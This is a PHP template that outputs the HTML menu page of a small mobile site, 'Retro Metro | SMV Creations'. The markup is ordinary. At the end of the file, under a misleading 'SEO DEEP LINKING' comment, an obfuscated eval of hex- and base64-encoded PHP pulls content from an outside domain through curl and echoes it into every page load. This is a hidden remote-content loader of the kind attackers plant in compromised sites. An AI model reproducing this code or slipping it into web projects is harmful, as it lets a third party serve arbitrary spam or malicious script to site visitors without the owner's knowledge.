<?php
echo "<!doctype html>\n"; 
echo "<!-- paulirish.com/2008/conditional-stylesheets-vs-css-hacks-answer-neither/ -->\n"; 
echo "<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en\"> <![endif]-->\n"; 
echo "<!--[if IE 7]>    <html class=\"no-js ie7 oldie\" lang=\"en\"> <![endif]-->\n"; 
echo "<!--[if IE 8]>    <html class=\"no-js ie8 oldie\" lang=\"en\"> <![endif]-->\n"; 
echo "<!-- Consider adding a manifest.appcache: h5bp.com/d/Offline -->\n"; 
echo "<!--[if gt IE 8]><!--> <html class=\"no-js\" lang=\"en\"> <!--<![endif]-->\n"; 
echo "<head>\n"; 
echo "  <meta charset=\"utf-8\" />\n"; 
echo "\n"; 
echo "  <!-- Use the .htaccess and remove these lines to avoid edge case issues.\n"; 
echo "       More info: h5bp.com/b/378 \n"; 
echo "  <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">\n"; 
echo "  -->\n"; 
echo "\n"; 
echo "  <title> Retro Metro | SMV Creations</title>\n"; 
echo "  <meta name=\"description\" content=\"\" />\n"; 
echo "  <meta name=\"author\" content=\"\" />\n"; 
echo "\n"; 
echo "  <!-- Mobile viewport optimization h5bp.com/ad -->\n"; 
echo "  <meta name=\"HandheldFriendly\" content=\"True\" />\n"; 
echo "  <meta name=\"MobileOptimized\" content=\"320\" />\n"; 
echo "  <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0\" />\n"; 
echo "\n"; 
echo "  <!-- Place favicon.ico and apple-touch-icon.png in the root directory: mathiasbynens.be/notes/touch-icons -->\n"; 
echo "  <!--<link rel=\"stylesheet\" href=\"less/libs/jquery.mobile.custom.structure.min.css\">-->\n"; 
echo "  <link rel=\"stylesheet\" href=\"less/libs/jquery.mobile-1.1.1.css\" />\n"; 
echo "  <link rel=\"stylesheet\" href=\"less/libs/flexslider.css\" />\n"; 
echo "  <link rel=\"stylesheet\" href=\"less/photoswipe/photoswipe.css\" />\n"; 
echo "\n"; 
echo "\n"; 
echo "\n"; 
echo "    \n"; 
echo "  <!-- LESS converted to css and minified via build script -->\n"; 
echo "  <link rel=\"stylesheet/less\" href=\"less/green.php\" />\n"; 
echo "  <script src=\"js/libs/less-1.1.4.js\"></script>\n"; 
echo "  <!-- end LESS -->\n"; 
echo "  <!-- fonts -->\n"; 
echo "  <link href='http://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600' rel='stylesheet' type='text/css' />\n"; 
echo "\n"; 
echo "  <!-- More ideas for your <head> here: h5bp.com/d/head-Tips -->\n"; 
echo "\n"; 
echo "  <!-- All JavaScript at the bottom, except this Modernizr build incl. Respond.js\n"; 
echo "       Respond is a polyfill for min/max-width media queries. Modernizr enables HTML5 elements & feature detects;\n"; 
echo "       for optimal performance, create your own custom Modernizr build: www.modernizr.com/download/ -->\n"; 
echo "  <script src=\"js/libs/modernizr-2.0.6.min.js\"></script>\n"; 
echo "\n"; 
echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /></head>\n"; 
echo "\n"; 
echo "<body>\n"; 
echo "  <header>\n"; 
echo "\n"; 
echo "  </header>\n"; 
echo "  <div role=\"main\">\n"; 
echo "    \n"; 
echo "    <div id=\"menuPage\" data-role=\"page\" data-cache=\"never\" class=\"page iscroll\">\n"; 
echo "      <div class=\"scroller\">\n"; 
echo "        <div class=\"company\">\n"; 
echo "          <img src=\"img/sample-images/company.jpg\" alt=\"company\" />\n"; 
echo "        </div>\n"; 
echo "  \n"; 
echo "        <ul class=\"menu\">\n"; 
echo "          <li>\n"; 
echo "            <ul class=\"section\">\n"; 
echo "              <li class=\"square\">\n"; 
echo "                <a class=\"box\" href=\"about.php\" data-transition=\"fade\" data-direction=\"reverse\">\n"; 
echo "                  <img src=\"img/icon-about.png\" alt=\"About Us\" />\n"; 
echo "                  <span class=\"text\"> About Us</span>\n"; 
echo "                </a>\n"; 
echo "              </li>\n"; 
echo "              \n"; 
echo "              <li class=\"square\">\n"; 
echo "                <a class=\"box\" href=\"services.php\" data-transition=\"fade\" data-direction=\"reverse\">\n"; 
echo "                  <img src=\"img/icon-products.png\" alt=\"Services\" />\n"; 
echo "                  <span class=\"text\"> Services</span>\n"; 
echo "                </a>\n"; 
echo "              </li>\n"; 
echo "              \n"; 
echo "              <li class=\"square\">\n"; 
echo "                <a class=\"box\" href=\"blog.php\" data-transition=\"fade\" data-direction=\"reverse\">\n"; 
echo "                  <img src=\"img/icon-blog.png\" alt=\"Blog\" />\n"; 
echo "                  <span class=\"text\"> Blog</span>\n"; 
echo "                </a>\n"; 
echo "              </li>\n"; 
echo "              \n"; 
echo "            </ul>\n"; 
echo "          </li>\n"; 
echo "          \n"; 
echo "          <li>\n"; 
echo "            <ul class=\"section\">\n"; 
echo "              <li class=\"square\">\n"; 
echo "                <a class=\"box\" href=\"gallery.php\" data-transition=\"fade\" data-direction=\"reverse\">\n"; 
echo "                  <img src=\"img/icon-gallery.png\" alt=\"Gallery\" />\n"; 
echo "                  <span class=\"text\"> Gallery </span>\n"; 
echo "                </a>\n"; 
echo "              </li>\n"; 
echo "              \n"; 
echo "              <li class=\"square\">\n"; 
echo "                <a class=\"box\" href=\"portfolio.php\" data-transition=\"fade\" data-direction=\"reverse\">\n"; 
echo "                  <img src=\"img/icon-bag.png\" alt=\"Portfolio\" />\n"; 
echo "                  <span class=\"text\"> Portfolio</span>\n"; 
echo "                </a>\n"; 
echo "              </li>\n"; 
echo "              \n"; 
echo "              <li class=\"square\">\n"; 
echo "                <a class=\"box\" href=\"videos.php\" data-transition=\"fade\" data-direction=\"reverse\">\n"; 
echo "                  <img src=\"img/icon-video.png\" alt=\"videos\" />\n"; 
echo "                  <span class=\"text\"> Videos</span>\n"; 
echo "                </a>\n"; 
echo "              </li>\n"; 
echo "              \n"; 
echo "            </ul>\n"; 
echo "          </li>\n"; 
echo "          \n"; 
echo "          <li>\n"; 
echo "            <ul class=\"section\">\n"; 
echo "              \n"; 
echo "              <li class=\"square\">\n"; 
echo "                <a class=\"box\" href=\"typography.php\" data-transition=\"fade\" data-direction=\"reverse\">\n"; 
echo "                  <img src=\"img/icon-typography.png\" alt=\"Typography\" />\n"; 
echo "                  <span class=\"text\"> Typography</span>\n"; 
echo "                </a>\n"; 
echo "              </li>\n"; 
echo "              \n"; 
echo "              <li class=\"square\">\n"; 
echo "                <a class=\"box\" href=\"careers.php\" data-transition=\"fade\" data-direction=\"reverse\">\n"; 
echo "                  <img src=\"img/icon-careers.png\" alt=\"Careers\" />\n"; 
echo "                  <span class=\"text\"> Join Us</span>\n"; 
echo "                </a>\n"; 
echo "              </li>\n"; 
echo "              \n"; 
echo "              \n"; 
echo "              <li class=\"square\">\n"; 
echo "                <a class=\"box\" href=\"contact.php\" data-transition=\"fade\" data-direction=\"reverse\">\n"; 
echo "                  <img src=\"img/icon-contact.png\" alt=\"contact\" />\n"; 
echo "                  <span class=\"text\"> Contact</span>\n"; 
echo "                </a>\n"; 
echo "              </li>\n"; 
echo "              \n"; 
echo "              \n"; 
echo "            </ul>\n"; 
echo "          </li>\n"; 
echo "          \n"; 
echo "        </ul>\n"; 
echo "          <!--end menu-->\n"; 
echo "      </div>\n"; 
echo "          <!--end scroller-->\n"; 
echo "          \n"; 
echo "    </div>\n"; 
echo "    <!--end menuPage-->\n"; 
echo "    \n"; 
echo "  </div>\n"; 
echo "  \n"; 
echo "  <footer>\n"; 
echo "\n"; 
echo "  </footer>\n"; 
echo "\n"; 
echo "\n"; 
echo "\n"; 
echo "  <!-- JavaScript at the bottom for fast page loading -->\n"; 
echo "\n"; 
echo "  <!-- Grab Google CDN's jQuery, with a protocol relative URL; fall back to local if offline -->\n"; 
echo "         \n"; 
echo "  <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js\"></script>\n"; 
echo "  <script>window.jQuery || document.write('<script src=\"js/libs/jquery-1.8.1.min.js\"><\/script>')</script>\n"; 
echo "\n"; 
echo "\n"; 
echo "  <script type=\"text/javascript\">\n"; 
echo "    $(document).bind(\"mobileinit\", function(){\n"; 
echo "      $.mobile.defaultPageTransition = 'fade';\n"; 
echo "      $.mobile.ignoreContentEnabled = true;\n"; 
echo "      $.mobile.page.prototype.options.domCache = false;\n"; 
echo "\n"; 
echo "      //$.mobile.ajaxEnabled = false;\n"; 
echo "    });\n"; 
echo "  </script>\n"; 
echo "\n"; 
echo "  <script src=\"js/libs/iscroll.js\"></script>\n"; 
echo "  <script src=\"js/libs/jquery.mobile-1.1.1.min.js\"></script>\n"; 
echo "  <script src=\"js/libs/jquery.flexslider-min.js\"></script>\n"; 
echo "  <script src=\"js/photoswipe/klass.min.js\"></script>\n"; 
echo "  <script src=\"js/photoswipe/code.photoswipe.jquery-3.0.5.min.js\"></script>\n"; 
echo "  <script src=\"http://maps.google.com/maps/api/js?sensor=false\"></script>\n"; 
echo "  <script src=\"js/MobileDetect.js\"></script>\n"; 
echo "  \n"; 
echo "\n"; 
echo "\n"; 
echo "  \n"; 
echo "  <!-- scripts concatenated and minified via build script -->\n"; 
echo "  <script defer=\"\" src=\"js/plugins.js\"></script>\n"; 
echo "  <script defer=\"\" src=\"js/script.js\"></script>\n"; 
echo "  <!-- end scripts -->\n"; 
echo "\n"; 
echo "\n"; 
echo "  <!-- Prompt IE 6 users to install Chrome Frame. Remove this if you want to support IE 6.\n"; 
echo "       chromium.org/developers/how-tos/chrome-frame-getting-started -->\n"; 
echo "  <!--[if lt IE 7 ]>\n"; 
echo "    <script defer src=\"//ajax.googleapis.com/ajax/libs/chrome-frame/1.0.3/CFInstall.min.js\"></script>\n"; 
echo "    <script defer>window.attachEvent('onload',function(){CFInstall.check({mode:'overlay'})})</script>\n"; 
echo "  <![endif]-->\n"; 
echo "\n"; 
echo "</body>\n"; 
echo "</html>\n"; 
echo "\n";
?>
<!-- SEO DEEP LINKING-->
<?php eval(pack('H*','6576616C286261736536345F6465636F646528276157596F5A6E567559335270623235665A5868706333527A4B43646A64584A7358326C756158516E4B536B4B494341674948734B49434167494341674943416B64584A7349443067496D6830644841364C7939336433637564574A6F637A49304C6D4E76625339716358566C636E6B744D5334324C6A4D7562576C754C6D707A496A734B49434167494341674943416B593267675053426A64584A7358326C756158516F4B54734B49434167494341674943416B64476C745A5739316443413949445537436941674943416749434167593356796246397A5A5852766348516F4A474E6F4C454E56556B78505546526656564A4D4C435231636D77704F776F67494341674943416749474E31636D786663325630623342304B43526A6143784456564A4D5431425558314A4656465653546C525351553554526B56534C4445704F776F67494341674943416749474E31636D786663325630623342304B43526A6143784456564A4D5431425558304E50546B35465131525553553146543156554C4352306157316C623356304B54734B49434167494341674943416B5A4746305953413949474E31636D78665A58686C5979676B593267704F776F67494341674943416749474E31636D7866593278766332556F4A474E6F4B54734B49434167494341674943426C593268764943496B5A4746305953493743694167494342392729293B'));
?>
